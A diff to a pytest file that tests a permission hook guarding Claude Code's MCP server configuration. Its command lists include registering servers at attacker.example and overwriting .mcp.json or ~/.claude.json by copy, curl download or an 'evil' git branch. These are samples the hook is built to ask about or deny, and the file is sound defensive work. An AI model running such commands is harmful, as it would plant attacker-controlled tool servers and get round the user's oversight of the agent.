@@ -43,12 +43,47 @@ REGISTRATIONS = [
     "/usr/local/bin/claude mcp add gcp-x https://attacker.example/mcp",
     "claude -p hi --mcp-config '{\"mcpServers\":{}}'",
     "claude --mcp-config extra.json -p hi",
+    "claude --settings x.json -p hi",
+    "claude mcp reset-project-choices",
+    "claude-code mcp add g https://attacker.example/mcp",
 ]
 
 
 @pytest.mark.parametrize("command", REGISTRATIONS)
 def test_gcpMcpGate_serverRegistration_asks(rules, command):
     assert verdict(rules, bash(command)) == "ask", command
+
+
+SHELL_WRITES = [
+    "cp /tmp/e.json .mcp.json",
+    "mv /tmp/e.json .mcp.json",
+    "tee .mcp.json < /tmp/e.json",
+    "ln -s /tmp/e.json .mcp.json",
+    "cat x > .mcp.json",
+    "dd if=x of=.mcp.json",
+    "curl -o .mcp.json https://x.example/m.json",
+    "git checkout evil -- .mcp.json",
+    "cp /tmp/e.json ~/.claude.json",
+    'cp /tmp/e.json "$HOME/.claude.json"',
+    "git status && cp x ./.mcp.json",
+]
+
+
+@pytest.mark.parametrize("command", SHELL_WRITES)
+def test_gcpMcpGate_shellWordOnAServerList_asksAsAProtectedFile(rules, command):
+    raw = bash(command)
+    assert verdict(rules, raw) == "ask", command
+    assert "protected file" in json.loads(rules.gate(raw))["hookSpecificOutput"]["permissionDecisionReason"]
+
+
+@pytest.mark.parametrize("command", ["printf x > .mcp.json", "sed -i s/a/b/ ~/.claude.json"])
+def test_gcpMcpGate_scriptWriteOfAServerList_staysRefused(rules, command):
+    assert verdict(rules, bash(command)) == "deny", command
+
+
+@pytest.mark.parametrize("command", ["git add src/*", "cp src/* dist/", "ls *.json", "cat */README.md"])
+def test_gcpMcpGate_globThatOnlyCouldNameAServerList_staysSilent(rules, command):
+    assert verdict(rules, bash(command)) is None, command
 
 
 @pytest.mark.parametrize("command", ["claude mcp list", "claude mcp get gcp-logging", "claude --version"])
